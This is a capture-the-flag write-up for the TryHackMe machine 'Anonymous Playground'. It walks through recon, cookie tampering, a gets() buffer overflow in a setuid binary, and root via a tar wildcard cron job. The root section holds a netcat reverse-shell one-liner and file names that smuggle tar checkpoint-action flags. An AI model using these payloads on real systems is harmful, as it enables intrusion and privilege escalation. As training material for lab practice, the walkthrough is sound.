---
layout: post
title: Anonymous Playground
subtitle: A hard-ish machine with a touch of crypto and binary exploitation
cover-img: /assets/img/THMlogo.png
tags: [tryhackme, writeup]
---

<b>Platform</b>: TryHackMe ([https://tryhackme.com]())<br>
<b>Machine Link</b>: [https://tryhackme.com/room/anonymousplayground]()<br>
<b>Difficulty</b>: <span style="color:red">Hard</span>

## Recon

The first step to every box is to run a classic nmap against the target (full ports, default scripts and version enumeration). This shows the following results:

```
# Nmap 7.80 scan initiated Sun Aug 16 17:06:45 2020 as: nmap -p- -sV -sC -oA nmap/full_TCP 10.10.19.90
Nmap scan report for 10.10.19.90
Host is up (0.080s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 60:b6:ad:4c:3e:f9:d2:ec:8b:cd:3b:45:a5:ac:5f:83 (RSA)
|   256 6f:9a:be:df:fc:95:a2:31:8f:db:e5:a2:da:8a:0c:3c (ECDSA)
|_  256 e6:98:52:49:cf:f2:b8:65:d7:41:1c:83:2e:94:24:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/zYdHuAKjP
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Proving Grounds
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug 16 17:07:23 2020 -- 1 IP address (1 host up) scanned in 38.39 seconds
```

We can see that there is an SSH service on standard port 22 and a web server on port 80, and nothing else. Usually these machines do no require any brute forcing or password guessing so we are going to ignore the port 22 for now.

Jumping on port 80, this is the site we see:

![Home Page](/assets/img/anonymousplayground_home.png){: .mx-auto.d-block :}

Nothing interesting, pretty static looking page - of the three sections listed at the top, only "operatives" is functional and redirects to `http://10.10.5.204/operatives.php`:

![Operatives Page](/assets/img/anonymousplayground_operatives.png){: .mx-auto.d-block :}

This shows a list of potential usernames and nothing else. For now, I'd put them in a list called `users.txt` and move on.

If we go back to the home page and analise the source code, we see the following comment:

```html
          <li class="nav-item">
                <a class="nav-link text-white" href="/operatives.php">Operatives</a>
            </li>
            <!-- <li class="nav-item">
                <a class="nav-link text-white" href="/upcoming.php">Upcoming Missions</a>
            </li> -->
            <li class="nav-item">
                <a class="nav-link text-white" href="#">Contact</a>
            </li>
        </ul>
        <pre class="text-center anon-mask">
```

This does look interesting, so let's browse to that page, and...

![Upcoming Page](/assets/img/anonymousplayground_upcoming.png){: .mx-auto.d-block :}

Worth a try. Now, let's fuzz for subdirectories and common files, I typicall use `ffuf` (the --fw filters every result with the word count of 20, which is Iknow it's not a good result):

```
ffuf -w /opt/SecLists/Discovery/Web-Content/big.txt -u http://10.10.5.204/FUZZ --fw 20

 :: Method           : GET
 :: URL              : http://10.10.5.204/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response words: 20
________________________________________________

robots.txt              [Status: 200, Size: 35, Words: 3, Lines: 2]
:: Progress: [20473/20473] :: Job [1/1] :: 2047 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```

Seems nothing is really going on in this website - however we do have a robots file. Let's check it out:

```
$ curl http://10.10.5.204/robots.txt
User-agent: *
Disallow: /zYdHuAKjP
```

That sounds interesting, but if we browse to that page:

![weird page](/assets/img/anonymousplayground_weirdpage.png){: .mx-auto.d-block :}

Nothing on here. However, the keyword here is "access" - looks like there is some sort of access control, but from previous fuzzing no admin panel was identified. The most common way to enforce access control is by setting cookies - let's check them:

![cookies](/assets/img/anonymousplayground_cookies.png){: .mx-auto.d-block :}

That "access" cookie looks interesting...wondering what happens if we change its value to "granted"?

![Granted](/assets/img/anonymousplayground_granted.png){: .mx-auto.d-block :}

Great! It looks like this is some sort of username and password combination, encrypted of course. So assuming the part before the "::" is the username, we can look back and search for a 10 characters username in the list we had before. However, nothing is 10 characters from what I could see. My second guess is that each 2 char is equivalent to one letter (e.g., hE = a letter, zA = another letter etc...), so we are looking for a 5 characters username, and if you notice the second couple and the last couple are the same character. It looks like only one username matches this condition, which is `magna`. Finding the password is just a matter of patience. 

Now, the quickest way to see if this is a valid user is to try and SSH into the box with the new credentials:

```
$ ssh magna@10.10.5.204
magna@10.10.5.204's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Aug 30 14:26:12 UTC 2020

  System load:  0.07               Processes:           98
  Usage of /:   22.8% of 19.56GB   Users logged in:     0
  Memory usage: 37%                IP address for eth0: 10.10.5.204
  Swap usage:   0%


3 packages can be updated.
0 updates are security updates.


Last login: Sun Aug 30 14:26:03 2020 from 10.8.78.207
magna@anonymous-playground:~$ hostname
anonymous-playground
magna@anonymous-playground:~$ 
```

and we're in!

## User 2

Now let's see if our user has some quick-win privileges:

```
magna@anonymous-playground:~$ sudo -l
[sudo] password for magna: 
Sorry, user magna may not run sudo on anonymous-playground.
```

No luck this time. But just a simple `ls` revealed an interesting binary that is definately related to the challange (hacktheworld):

```
magna@anonymous-playground:~$ ls -la
total 64
drwxr-xr-x 7 magna  magna  4096 Jul 10 02:17 .
drwxr-xr-x 5 root   root   4096 Jul  4 19:25 ..
lrwxrwxrwx 1 root   root      9 Jul  4 19:42 .bash_history -> /dev/null
-rw-r--r-- 1 magna  magna   220 Jul  4 16:47 .bash_logout
-rw-r--r-- 1 magna  magna  3771 Jul  4 16:47 .bashrc
drwx------ 2 magna  magna  4096 Jul  4 20:49 .cache
drwxr-xr-x 3 magna  magna  4096 Jul  7 01:04 .config
drwx------ 3 magna  magna  4096 Jul  4 20:49 .gnupg
drwxrwxr-x 3 magna  magna  4096 Jul  4 20:47 .local
-rw-r--r-- 1 magna  magna   807 Jul  4 16:47 .profile
drwx------ 2 magna  magna  4096 Jul  4 20:55 .ssh
-rw------- 1 magna  magna   817 Jul  7 01:52 .viminfo
-r-------- 1 magna  magna    33 Jul  4 19:44 flag.txt
-rwsr-xr-x 1 root   root   8528 Jul 10 01:47 hacktheworld
-rw-r--r-- 1 spooky spooky  324 Jul  6 21:24 note_from_spooky.txt
```

Looks like spooky left a note for us, let's check it out:

```
magna@anonymous-playground:~$ cat note_from_spooky.txt 
Hey Magna,

Check out this binary I made!  I've been practicing my skills in C so that I can get better at Reverse
Engineering and Malware Development.  I think this is a really good start.  See if you can break it!

P.S. I've had the admins install radare2 and gdb so you can debug and reverse it right here!

Best,
Spooky
```

How kind, gdb is right on the box! (although there is no `gef`...maybe next time?). First off, let's run the binary:

```
magna@anonymous-playground:~$ ./hacktheworld 
Who do you want to hack? AAAAAAAAAAAA
magna@anonymous-playground:~$ 
```

Let's scream a bit more at the binary:

```
magna@anonymous-playground:~$ python -c 'print("A"*200)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
magna@anonymous-playground:~$ ./hacktheworld 
Who do you want to hack? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
magna@anonymous-playground:~$ 
```

Alright, so there is some kind of buffer overflow. Gdb time - let's put a break on main and disassemble it

```bash
(gdb) b main
Breakpoint 1 at 0x4006dc
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/magna/hacktheworld 

Breakpoint 1, 0x00000000004006dc in main ()
(gdb) disas
Dump of assembler code for function main:
   0x00000000004006d8 <+0>:     push   %rbp
   0x00000000004006d9 <+1>:     mov    %rsp,%rbp
=> 0x00000000004006dc <+4>:     sub    $0x50,%rsp
   0x00000000004006e0 <+8>:     mov    %edi,-0x44(%rbp)
   0x00000000004006e3 <+11>:    mov    %rsi,-0x50(%rbp)
   0x00000000004006e7 <+15>:    lea    0x11d(%rip),%rdi        # 0x40080b
   0x00000000004006ee <+22>:    mov    $0x0,%eax
   0x00000000004006f3 <+27>:    callq  0x400530 <printf@plt>
   0x00000000004006f8 <+32>:    lea    -0x40(%rbp),%rax
   0x00000000004006fc <+36>:    mov    %rax,%rdi
   0x00000000004006ff <+39>:    mov    $0x0,%eax
   0x0000000000400704 <+44>:    callq  0x400540 <gets@plt>
   0x0000000000400709 <+49>:    mov    $0x0,%eax
   0x000000000040070e <+54>:    leaveq 
   0x000000000040070f <+55>:    retq   
End of assembler dump.
```

Luckily for us the binary is pretty easy; it looks like our input is read with a call to `gets`, so we can put our breakpoint on the address after this call (`b *0x0000000000400709`). Now to make things easier, I generate a pattern on my machine:

```bash
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
```

And submit this as an input. It will hit the breakpoint, and `info registers` will reveal at what point `$rbp` is overwritten:

```
(gdb) ni
0x000000000040070f in main ()
(gdb) info registers 
rax            0x0      0
rbx            0x0      0
rcx            0x7ff691614a00   140696977754624
rdx            0x7ff6916168d0   140696977762512
rsi            0x1801671        25171569
rdi            0x7ffc374b1611   140721236153873
rbp            0x6161616161616169       0x6161616161616169
rsp            0x7ffc374b1658   0x7ffc374b1658
r8             0x18016d5        25171669
```

You can see that rbp was overwritten at `0x6161616161616169`, which is hex for `aaaaaai`, that is at poition 64 in our pattern. Now, in a typical buffer overflow you can overwrite this with x64 shellcode and invoke `sh` , but this binary already has a call to bash embedded, so the quickest way is just to jump to that address (which is left as an exercise):

```
magna@anonymous-playground:~$ (python -c 'print "A"*64+"<invoke bash address>"'; cat -)| ./hacktheworld
Who do you want to hack? 
We are Anonymous.
We are Legion.
We do not forgive.
We do not forget.
[Message corrupted]...Well...done.
id
uid=1337(spooky) gid=1001(magna) groups=1001(magna)
whoami
spooky
```

Cool, we are the `spooky` user now!

## Root

Finally, let's get root on this box. To get more comfortable, we can spawn a pty with python (`python -c "import pty;pty.spawn('/bin/bash')`). I run the usual LinEnum.sh and linpeas.sh, but I'll jump straight to it; if you look at the cronjobs:

```
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/1 *   * * *   root    cd /home/spooky && tar -zcf /var/backups/spooky.tgz *
#
```

Now, see that wildcard at the end? That's bad. A quick google search for "wildcard crontab privesc" reaveals why - tar allows user to execute commands (in this case as root) if provided with certain flags. And due to the way the wildcard is interpreted, we can prodide these flags as file names. So what we are going to do is:

1) create a script (let's call it `not_a_shell.sh`) which creates a reverse shell to our box
2) exploit the checkpoint argument (for more info, `man tar` or [https://gtfobins.github.io/gtfobins/tar/]()) to set up the action and run it

In this case our action is going to be running our `not_a_shell.sh` script. Putting it all together, let's move into `/home/spooky` and:

Create `not_a_shell.sh` script with a reverse shell:

```
echo "mkfifo /tmp/zzz; nc <IP> <PORT> 0</tmp/zzz | /bin/sh >/tmp/zzz 2>&1; rm /tmp/zzz" > not_a_shell.sh
```

Create and invoke the checkpoint:
```
echo "" > "--checkpoint-action=exec=sh not_a_shell.sh"
echo "" > --checkpoint=1
```

Give it a minute, and finally you should get a shell back as root:

```
$ nc -lvp 9090
listening on [any] 9090 ...
10.10.27.73: inverse host lookup failed: Unknown host
connect to [10.8.78.207] from (UNKNOWN) [10.10.27.73] 56786
id 
uid=0(root) gid=0(root) groups=0(root)
whoami
root
wc -l /root/flag.txt
1 /root/flag.txt
```

Overall it was a nice box, with a mix of easy crypto, web hacking and reversing.
